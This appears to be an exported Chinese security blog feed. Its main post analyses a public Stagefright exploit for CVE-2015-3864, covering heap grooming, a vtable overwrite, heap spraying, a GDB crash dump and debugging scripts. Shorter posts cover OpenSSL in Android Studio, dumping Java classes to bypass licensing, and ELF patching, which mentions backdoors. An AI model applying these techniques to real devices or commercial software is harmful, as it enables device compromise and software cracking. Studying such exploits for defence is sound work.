在这里，会释放掉原来那个，新分配内存来容纳新的数据。</div><div class="line">// 因此我们有了一个 分配，释放 内存能力</div><div class="line">// setData 中会释放掉原来的buf, 新分配一个 chunk_data_size</div><div class="line"></div><div class="line">         mLastTrack-&gt;meta-&gt;setData(</div><div class="line">                 kKeyAVCC, kTypeAVCC, buffer-&gt;data(), chunk_data_size);</div><div class="line"></div><div class="line">         *offset += chunk_size;</div><div class="line">         break;</div><div class="line">     &#125;</div></pre></td></tr></table></figure>
<p>首先根据 <code>chunk_data_size</code> 分配 <code>ABuffer</code> 到 <code>buffer</code>，<code>chunk_data_size</code> 在 <code>box</code> 的 <code>size</code> 域指定，注意<code>buffer</code>是一个智能指针，在这里，它会在函数返回时释放。</p>
<p><code>ABuffer</code> 中是直接调用的 <code>malloc</code> 分配的内存。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1511322333438n9iujtsk.png?imageslim" alt="paste image"><br>接下来读取数据到 <code>buffer-&gt;data()</code>, 最后调用 <code>mLastTrack-&gt;meta-&gt;setData</code> 保存数据到 <code>meta</code>, 在 <code>setData</code> 内部会先释放掉之前的内存，然后分配的内存，存放该数据，此时分配内存的大小还是<code>chunk_data_size</code>, 我们可控。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1511322457145o2ojlgaf.png?imageslim" alt="paste image"></p>
<p><code>hvcC</code> 的处理方式基本一样。所以通过这两个 <code>box</code> 我们可以 <strong>分配指定大小的内存，并且可以随时释放前面分配的那个内存块</strong> 。我们需要使用这个来布局<code>tx3g</code>内存块 和 <code>MPEG4DataSource</code>内存块。</p>
<p><strong>修改对象虚表指针</strong></p>
<p>下面结合<code>exploit</code> 和上一节的那几个关键 <code>box</code> ，分析通过布局内存，使得我们可以修改 <code>MPEG4DataSource</code> 的虚表指针。<br>为了便于说明，取了 <code>exploit</code> 中的用于 <code>修改对象虚表指针</code>的相关代码进行解析 ( 我调试过程做了部分修改 )<br><img src="http://oy9h5q2k4.bkt.clouddn.com/15113295608707xyip57h.png?imageslim" alt="paste image"></p>
<p>首先看到第<code>7，8</code>行，构造了第一个 <code>tx3g box</code>, 大小为 <code>0x3a8</code>， 后面在触发漏洞时，会先把这部分数据拷贝到分配到的小内存<code>buffer</code>中，然后会溢出到下一个 <code>region</code> 的 <code>MPEG4DataSource</code>内存块。使用 <code>cyclic</code> 可以在程序 <code>crash</code> 时，计算 <code>buffer</code> 和 <code>MPEG4DataSource</code> 之间的距离。</p>
<p>第 <code>13</code> 行，调用了 <code>memory_leak</code> 函数， 该函数通过使用 <code>pssh</code> 来分配任意大小的内存，在这里分配的是 <code>alloc_size</code> ，即 <code>0x20</code>. 因为<code>MPEG4DataSource</code> 的大小为 <code>0x20</code> ,就保证内存的分配会在同一个 <code>run</code> 中分配。这些这样这里分配了 <code>4</code> 个 <code>0x20</code> 的内存块，我认为是用来清理之前可能使用内存时，产生的内存碎片，确保后面内存分配按照我们的顺序进行分配。此时内存关系</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">| pssh | - | pssh |</div></pre></td></tr></table></figure>
<p>第 <code>17</code> 到 <code>25</code> 行，清理内存后,开始分配 <code>avcC</code> 和 <code>hvcC</code>, 大小也是 <code>0x20</code>， 然后在第 <code>25</code> 行又进行了内存碎片清理，原因在于我们在分配 <code>avcC</code> 和 <code>hvcC</code>时，会使用到 <code>new ABuffer(chunk_data_size)</code>,这个临时的缓冲区，这个会在函数返回时被释放（请看智能指针相关知识）</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1511330396572jzet4fq5.png?imageslim" alt="paste image"><br>同时多分配了几个 <code>pssh</code> 确保可以把 <code>avcC</code> 和 <code>hvcC</code>包围在中间。所以现在的内存关系是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">| pssh | - | pssh | pssh | avcC | hvcC | pssh |</div></pre></td></tr></table></figure>
<p>然后是 第 <code>29</code> 行， 再次分配 <code>hvcC</code> ,不过这次的大小 为 <code>alloc_size * 2</code>, 触发 <code>hvcC</code> 的释放，而且确保不会占用 刚刚释放的 内存.（jemalloc中  相同大小的内存在同一个run中分配）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">| pssh | - | pssh | pssh | avcC | .... | pssh |</div></pre></td></tr></table></figure></p>
<p>接下来构造 <code>stbl</code> 用 <code>MPEG4DataSource</code> 占据刚刚空出来的 内存。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">| pssh | - | pssh | pssh | avcC | MPEG4DataSource | pssh |</div></pre></td></tr></table></figure></p>
<p>接下来， 第 <code>38</code> 行用同样的手法分配释放 <code>avcC</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">| pssh | - | pssh | pssh | .... | MPEG4DataSource | pssh |</div></pre></td></tr></table></figure></p>
<p>然后使用整数溢出，计算得到第二个 <code>tx3g</code> 的长度值，使得最后分配到的内存大小为<code>0x20</code>, 用来占据刚刚空闲的 <code>avcC</code> 的 内存块，于是现在的内存布局，就会变成这样。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">| pssh | - | pssh | pssh | tx3g | MPEG4DataSource | pssh |</div></pre></td></tr></table></figure>
<p>然后在</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1511331158750fgbh83d2.png?imageslim" alt="paste image"><br>就会溢出修改了 <code>MPEG4DataSource</code> 的虚表指针。然后在下面的 <code>readAt</code> 函数调用出会 <code>crash</code>.</p>
<p>我测试时得好几次才能成功一次，估计和内存碎片相关。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">Thread 10 received signal SIGSEGV, Segmentation fault.</div><div class="line">0xb66b57cc in android::MPEG4Extractor::parseChunk (this=this@entry=0xb74e2138, offset=offset@entry=0xb550ca98, depth=depth@entry=0x2) at frameworks/av/media/libstagefright/MPEG4Extractor.cpp:1905</div><div class="line">1905	            if ((size_t)(mDataSource-&gt;readAt(*offset, buffer + size, chunk_size))</div><div class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ registers ]────</div><div class="line">$r0   : 0xb74e27b8  →  0x61616169 (&quot;iaaa&quot;?)</div><div class="line">$r1   : 0xb74e2bb8  →  0x00000000</div><div class="line">$r2   : 0x61616169 (&quot;iaaa&quot;?)</div><div class="line">$r3   : 0x00000000</div><div class="line">$r4   : 0xb550c590  →  0x00000428</div><div class="line">$r5   : 0xfffffbf8</div><div class="line">$r6   : 0xb550c580  →  0xb74e5c98  →  0x28040000</div><div class="line">$r7   : 0xb550c570  →  0xfffffbf8</div><div class="line">$r8   : 0xb74e2138  →  0xb6749f18  →  0xb66b2841  →  &lt;android::MPEG4Extractor::~MPEG4Extractor()+1&gt; ldr r3,  [pc,  #188]	; (0xb66b2900 &lt;android::MPEG4Extractor::~MPEG4Extractor()+192&gt;)</div><div class="line">$r9   : 0x74783367 (&quot;g3xt&quot;?)</div><div class="line">$r10  : 0xb550ca98  →  0x01000a98</div><div class="line">$r11  : 0xb74e2790  →  0x28040000</div><div class="line">$r12  : 0x00000000</div><div class="line">$sp   : 0xb550c530  →  0xb74e2bb8  →  0x00000000</div><div class="line">$lr   : 0xb66b57bd  →  &lt;android::MPEG4Extractor::parseChunk(long+0&gt; ldr r1,  [r4,  #0]</div><div class="line">$pc   : 0xb66b57cc  →  &lt;android::MPEG4Extractor::parseChunk(long+0&gt; ldr r6,  [r2,  #28]</div><div class="line">$cpsr : [THUMB fast interrupt overflow carry ZERO negative]</div><div class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</div><div class="line">$r0   : 0x00000000</div><div class="line">$r1   : 0xb74e2bb8  →  0x00000000</div><div class="line">$r2   : 0x61616169 (&quot;iaaa&quot;?)</div><div class="line">$r3   : 0x00000000</div><div class="line">$r4   : 0xb550c590  →  0x00000428</div><div class="line">$r5   : 0xfffffbf8</div><div class="line">$r6   : 0xb550c580  →  0xb74e5c98  →  0x28040000</div><div class="line">$r7   : 0xb550c570  →  0xfffffbf8</div><div class="line">$r8   : 0xb74e2138  →  0xb6749f18  →  0xb66b2841  →  &lt;android::MPEG4Extractor::~MPEG4Extractor()+1&gt; ldr r3,  [pc,  #188]	; (0xb66b2900 &lt;android::MPEG4Extractor::~MPEG4Extractor()+192&gt;)</div><div class="line">$r9   : 0x74783367 (&quot;g3xt&quot;?)</div><div class="line">$r10  : 0xb550ca98  →  0x01000a98</div><div class="line">$r11  : 0xb74e2790  →  0x28040000</div><div class="line">$r12  : 0x00000000</div><div class="line">$sp   : 0xb550c530  →  0xb74e2bb8  →  0x00000000</div><div class="line">$lr   : 0xb66b57bd  →  &lt;android::MPEG4Extractor::parseChunk(long+0&gt; ldr r1,  [r4,  #0]</div><div class="line">$pc   : 0xb66b57cc  →  &lt;android::MPEG4Extractor::parseChunk(long+0&gt; ldr r6,  [r2,  #28]</div><div class="line">$cpsr : [THUMB fast interrupt overflow carry ZERO negative]</div></pre></td></tr></table></figure></p>
<p>可以看到断在了<code>&lt;android::MPEG4Extractor::parseChunk(long+0&gt; ldr r6,  [r2,  #28]</code>,去 <code>ida</code> 里面找到对应的位置。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15113320522611r713790.png?imageslim" alt="paste image"><br><code>r2</code>存放的就是虚表指针，可以确定成功修改了 虚函数表指针。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1511332282692sjn299pl.png?imageslim" alt="paste image"></p>
<p>偏移也符合预期。</p>
<p><strong>堆喷射</strong></p>
<p>上面我们已经成功修改了<code>MPEG4DataSource</code> 的虚表指针,并在虚函数调用时触发了 <code>crash</code> .</p>
<p>我们现在能够修改对象的 虚表指针，并且能够触发虚函数调用。我们需要在一个可预测的内存地址精准的布置我们的数据，然后把虚表指针修改到这里，在 <code>exploit</code> 中使用了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">spray_size = 0x100000</div><div class="line">spray_count = 0x10</div><div class="line"></div><div class="line">sample_table(heap_spray(spray_size) * spray_count)</div></pre></td></tr></table></figure></p>
<p>来进行堆喷射 </p>
<p><code>heap_spray</code> 函数 就是使用 <code>pssh</code> 来喷射的内存。每次分配 <code>0x100</code> 页，共分配了 <code>0x10</code> 次。 <code>exploit</code> 作者在 博客中写道，这样就可以在可预测的内存地址中定位到特定数据。在这里就是 用于 <code>stack_pivot</code> 的 <code>gadget</code>.</p>
<p>对于这一点，我很疑惑，<strong>有大佬可以告诉我为什么可以这样吗？ 或者有没有相关的 <code>paper</code> 来介绍为什么可以在 可预测的地址 精确的布置我们的数据</strong></p>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>这个 <code>exploit</code> 写的确实强悍，提示我在进行漏洞利用时，要关注各种可能分配内存的地方，灵活的使用代码中的内存分配，来布局内存。 同时研究一个漏洞要把相关知识给补齐。对于这个漏洞就是 <code>MPEG4</code> 的文件格式和 相关的处理代码了。</p>
<p>一些tips：</p>
<ul>
<li>使用 <code>gef</code> + <code>gdb-multiarch</code> 来调试 , <code>pwndbg</code> 我用着非常卡， <code>gef</code> 就不会</li>
<li>调试过程尽量使用脚本减少重复工作量。</li>
</ul>
<p>使用的一些脚本。</p>
<p>使用 <code>gdbserver attach mediaserver</code> 并转发端口的脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">adb root</div><div class="line">adb forward tcp:1234 tcp:1234</div><div class="line">a=`adb shell &quot;ps | grep mediaserver&quot; |  awk &apos;&#123;printf $2&#125;&apos;`</div><div class="line">echo $a</div><div class="line">adb shell &quot;gdbserver --attach :1234 $a&quot;</div></pre></td></tr></table></figure>
<p><code>gdb</code> 的调试脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">set arch armv5</div><div class="line">gef-remote 127.0.0.1:1234</div><div class="line">set solib-search-path debug_so/</div><div class="line">directory android-5.1.0_r3/</div><div class="line">gef config context.layout &quot;regs -source&quot;</div><div class="line">set logging file log.txt</div><div class="line">set logging on</div><div class="line">break frameworks/av/media/libstagefright/MPEG4Extractor.cpp:1897 </div><div class="line">break frameworks/av/media/libstagefright/MPEG4Extractor.cpp:1630</div><div class="line">break frameworks/av/media/libstagefright/MPEG4Extractor.cpp:1647</div><div class="line">break frameworks/av/media/libstagefright/MPEG4Extractor.cpp:884</div><div class="line">commands 1</div><div class="line">p chunk_size</div><div class="line">p buffer</div><div class="line">c</div><div class="line">end</div><div class="line"></div><div class="line">commands 2</div><div class="line">p buffer</div><div class="line"></div><div class="line">end</div><div class="line"></div><div class="line">commands 3</div><div class="line">p buffer</div><div class="line">c</div><div class="line">end</div><div class="line"></div><div class="line">commands 4</div><div class="line">hexdump dword  mDataSource 0x4</div><div class="line">c</div><div class="line">end</div></pre></td></tr></table></figure>
<p>参考：</p>
<p><a href="https://census-labs.com/media/shadow-infiltrate-2017.pdf" target="_blank" rel="external">https://census-labs.com/media/shadow-infiltrate-2017.pdf</a></p>
<p><a href="https://googleprojectzero.blogspot.hk/" target="_blank" rel="external">https://googleprojectzero.blogspot.hk/</a></p>
<p><a href="http://blog.csdn.net/zhuweigangzwg/article/details/17222951" target="_blank" rel="external">http://blog.csdn.net/zhuweigangzwg/article/details/17222951</a></p>
]]></content>
      
        <categories>
            
            <category> 安卓安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CVE-2015-3864 </tag>
            
            <tag> 文件格式漏洞 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[android studio使用openssl]]></title>
      <url>/2017/11/19/android_studio_use_openssl.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>逆向的基础是开发， 逆向分析时很多时候会使用一些公开的加密函数来对数据进行加密，通过使用 <code>openssl</code> 熟悉下。</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>首先得先编译出来 <code>openssl</code>，然后把它们复制到你的工程目录下。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15110733397054zqc1idw.png?imageslim" alt="paste image"></p>
<p><code>include</code> 是 <code>openssl</code> 的头文件。<code>lib</code> 下的那些是编译出来的so。</p>
<p>然后修改 <code>build.gradle</code> 中的 <code>cmake</code> 项：</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1511073468721ci33oo8v.png?imageslim" alt="paste image"></p>
<p><code>cppFlags</code> 是编译选项， <code>abiFilters</code>指定编译so的 <code>abi</code>，和 刚才 <code>lib</code> 目录中的目录项对应。后面会用到。</p>
<p>增加 <img src="http://oy9h5q2k4.bkt.clouddn.com/1511073600119rzvpfdcl.png?imageslim" alt="paste image"></p>
<p><code>jniLibs.srcDirs</code> 的值为<code>openssl</code> so的目录。表示打包时直接复制这些就行了。<br>最终的 <code>build.gradle</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line">apply plugin: &apos;com.android.application&apos;</div><div class="line"></div><div class="line">android &#123;</div><div class="line">    compileSdkVersion 26</div><div class="line">    defaultConfig &#123;</div><div class="line">        applicationId &quot;com.example.administrator.oi&quot;</div><div class="line">        minSdkVersion 19</div><div class="line">        targetSdkVersion 26</div><div class="line">        versionCode 1</div><div class="line">        versionName &quot;1.0&quot;</div><div class="line">        testInstrumentationRunner &quot;android.support.test.runner.AndroidJUnitRunner&quot;</div><div class="line">        externalNativeBuild &#123;</div><div class="line">            cmake &#123;</div><div class="line">                cppFlags &quot;-std=c++11 -frtti -fexceptions&quot;</div><div class="line">                abiFilters &apos;armeabi&apos;, &apos;armeabi-v7a&apos;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    buildTypes &#123;</div><div class="line">        release &#123;</div><div class="line">            minifyEnabled false</div><div class="line">            proguardFiles getDefaultProguardFile(&apos;proguard-android.txt&apos;), &apos;proguard-rules.pro&apos;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    sourceSets &#123;</div><div class="line">        main &#123;</div><div class="line">            jniLibs.srcDirs = [&quot;C:\\Users\\Administrator\\AndroidStudioProjects\\oi\\app\\openssl_resouce\\lib&quot;]</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    externalNativeBuild &#123;</div><div class="line">        cmake &#123;</div><div class="line">            path &quot;CMakeLists.txt&quot;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">dependencies &#123;</div><div class="line">    implementation fileTree(dir: &apos;libs&apos;, include: [&apos;*.jar&apos;])</div><div class="line">    implementation &apos;com.android.support:appcompat-v7:26.1.0&apos;</div><div class="line">    implementation &apos;com.android.support.constraint:constraint-layout:1.0.2&apos;</div><div class="line">    testImplementation &apos;junit:junit:4.12&apos;</div><div class="line">    androidTestImplementation &apos;com.android.support.test:runner:1.0.1&apos;</div><div class="line">    androidTestImplementation &apos;com.android.support.test.espresso:espresso-core:3.0.1&apos;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>然后修改 <code>CMakeLists.txt</code>， 中文注释的地方就是修改的地方。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line"># For more information about using CMake with Android Studio, read the</div><div class="line"># documentation: https://d.android.com/studio/projects/add-native-code.html</div><div class="line"></div><div class="line"># Sets the minimum version of CMake required to build the native library.</div><div class="line"></div><div class="line">cmake_minimum_required(VERSION 3.4.1)</div><div class="line"></div><div class="line"># 设置头文件加载的目录</div><div class="line">include_directories(C:/Users/Administrator/AndroidStudioProjects/oi/app/openssl_resouce/include)</div><div class="line"></div><div class="line"></div><div class="line">#动态方式加载</div><div class="line">add_library(openssl SHARED IMPORTED )</div><div class="line">add_library(ssl SHARED IMPORTED )</div><div class="line"></div><div class="line">#引入第三方.so库，根据$&#123;ANDROID_ABI&#125; 引用不同的库</div><div class="line">set_target_properties(openssl PROPERTIES IMPORTED_LOCATION C:/Users/Administrator/AndroidStudioProjects/oi/app/openssl_resouce/lib/$&#123;ANDROID_ABI&#125;/libcrypto.so)</div><div class="line">set_target_properties(ssl PROPERTIES IMPORTED_LOCATION C:/Users/Administrator/AndroidStudioProjects/oi/app/openssl_resouce/lib/$&#123;ANDROID_ABI&#125;/libssl.so)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"># Creates and names a library, sets it as either STATIC</div><div class="line"># or SHARED, and provides the relative paths to its source code.</div><div class="line"># You can define multiple libraries, and CMake builds them for you.</div><div class="line"># Gradle automatically packages shared libraries with your APK.</div><div class="line"></div><div class="line">add_library( # Sets the name of the library.</div><div class="line">             native-lib</div><div class="line"></div><div class="line">             # Sets the library as a shared library.</div><div class="line">             SHARED</div><div class="line"></div><div class="line">             # Provides a relative path to your source file(s).</div><div class="line">             src/main/cpp/native-lib.cpp )</div><div class="line"></div><div class="line"># Searches for a specified prebuilt library and stores the path as a</div><div class="line"># variable. Because CMake includes system libraries in the search path by</div><div class="line"># default, you only need to specify the name of the public NDK library</div><div class="line"># you want to add. CMake verifies that the library exists before</div><div class="line"># completing its build.</div><div class="line"></div><div class="line">find_library( # Sets the name of the path variable.</div><div class="line">              log-lib</div><div class="line"></div><div class="line">              # Specifies the name of the NDK library that</div><div class="line">              # you want CMake to locate.</div><div class="line">              log )</div><div class="line"></div><div class="line"># Specifies libraries CMake should link to your target library. You</div><div class="line"># can link multiple libraries, such as libraries you define in this</div><div class="line"># build script, prebuilt third-party libraries, or system libraries.</div><div class="line"></div><div class="line"># 设置链接选项</div><div class="line">target_link_libraries( # Specifies the target library.</div><div class="line">                       native-lib</div><div class="line">                       openssl</div><div class="line">                       ssl</div><div class="line"></div><div class="line">                       # Links the target library to the log library</div><div class="line">                       # included in the NDK.</div><div class="line">                       $&#123;log-lib&#125; )</div></pre></td></tr></table></figure>
<p>然后就可以使用了。</p>
<p>项目路径</p>
<p><a href="https://gitee.com/hac425/android_openssl/" target="_blank" rel="external">https://gitee.com/hac425/android_openssl/</a></p>
]]></content>
      
        <categories>
            
            <category> 安卓安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> openssl </tag>
            
            <tag> 开发 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[使用sa-jdi.jar dump 内存中的class]]></title>
      <url>/2017/11/17/use_sa_jdi_jar_dump_class.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在分析一个 <code>jar</code> 包时发现他把关键类采用了运行时使用 <code>classloader</code> 的方式加载了。懒得分析算法了，可以使用 <code>jdk</code> 自带的工具 <code>dump</code> 出需要的<code>class</code>.</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>从运行的java进程里dump出运行中的类的class文件的方法，所知道的有两种</p>
<ul>
<li><p>用agent attatch 到进程，然后利用 Instrumentation和 ClassFileTransformer就可以获取 到类的字节码了。</p>
</li>
<li><p>使用 sd-jdi.jar里的工具</p>
</li>
</ul>
<p>本文介绍的就是使用 <code>sd-jdi.jar</code> 来dump.  <code>sd-jdi.jar</code>里自带的的 <code>sun.jvm.hotspot.tools.jcore.ClassDump</code> 可以把类的class内容dump到文件里。</p>
<p><code>ClassDump</code> 里可以设置两个 <code>System properties</code>：</p>
<ul>
<li>sun.jvm.hotspot.tools.jcore.filter  Filter的类名</li>
<li>sun.jvm.hotspot.tools.jcore.outputDir 输出的目录</li>
</ul>
<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>首先写一个 <code>filter</code> 类</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">import sun.jvm.hotspot.tools.jcore.ClassFilter;</div><div class="line">import sun.jvm.hotspot.oops.InstanceKlass;</div><div class="line">import sun.jvm.hotspot.tools.jcore.ClassDump;</div><div class="line">public class MyFilter implements ClassFilter &#123;</div><div class="line">    @Override</div><div class="line">    public boolean canInclude(InstanceKlass kls) &#123;</div><div class="line">        String klassName = kls.getName().asString();</div><div class="line">        return klassName.startsWith(&quot;com/fr/license/selector/&quot;);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>代码很显而易见了， 作用是 <code>dump</code> 所有 以 <code>com/fr/license/selector/</code> 开头的 类的· 字节码。</p>
<p>然后编译成class文件</p>
<p>要使用这个首先需要把  <code>sa-jdi.jar</code> 加到 <code>java</code> 的 <code>classpath</code> 里。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1510917062153e72v6rn3.png?imageslim" alt="paste image"></p>
<p>进入 刚刚写的 <code>filter</code> 类的class文件的目录下。执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">java  -Dsun.jvm.hotspot.tools.jcore.filter=MyFilter  -Dsun.jvm.hotspot.tools.jcore.outputDir=d:\dump  sun.jvm.hotspot.tools.jcore.ClassDump 5308</div></pre></td></tr></table></figure>
<p>把<code>MyFilter</code> 改为你自己的类名， <code>5308</code> 为目标 java进程的 <code>pid</code>(可以使用 <code>jps</code> 查看）。然后就会在 <code>d:\dump</code> 产生相应的 <code>class</code> 文件。</p>
<h3 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h3><ul>
<li><p>如果直接点击应用的 exe, 来启动应用，使用 jps 获取到的 pid， 可能没有办法附加， 所以我们要找到启动的命令， 比如 bat脚本里面。</p>
</li>
<li><p>一般大型应用会自带 jre, 我们要使用上面的技术，替换 jre,为我们的，才能正常dump, 否则会出现版本不匹配。</p>
</li>
<li>windows下还需把 <code>sawindbg.dll</code> 放到 <code>jre/bin/</code> 和java.exe 同目录下。否则可能会遇到 加载不了这个 dll 的问题。</li>
</ul>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1510919261728mq8ffmr8.png?imageslim" alt="paste image"></p>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>搞java应用第一步还是找到启动的命令，便于后面的分析。一般别使用 <code>exe</code>启动应用</p>
]]></content>
      
        <categories>
            
            <category> java应用破解思路 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> dump class </tag>
            
            <tag> sa-jdi.jar </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[可执行文件patch技术&&持续更新]]></title>
      <url>/2017/11/07/patch_file_methods.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在ctf比赛中， 有时我们需要对可执行文件进行patch, 或者在植入后门时，patch也是常用的手段。不过手工patch比较麻烦，下面介绍几个工具。本文介绍遇到的各种技术，不断更新。</p>
<h3 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h3><h4 id="Patchkit"><a href="#Patchkit" class="headerlink" title="Patchkit"></a>Patchkit</h4><p>地址：<br><a href="https://github.com/lunixbochs/patchkit.git" target="_blank" rel="external">https://github.com/lunixbochs/patchkit.git</a></p>
<p>1.由于链接器的原因暂时还不能使用 libc 中的函数，所以所有要做的事情都需要我们自己实现。用 c 或者 asm</p>
<ul>
<li><code>pt.patch(addr,jmp=jmp_addr)</code>  用于修改程序流程。</li>
<li><code>pt.hook(addr, target)</code> 用于劫持程序流程，进行参数过滤。</li>
</ul>
<p>使用方式：<code>./patch binary_file patch.py</code></p>
<p>过滤printf中 %n 的脚本。</p>
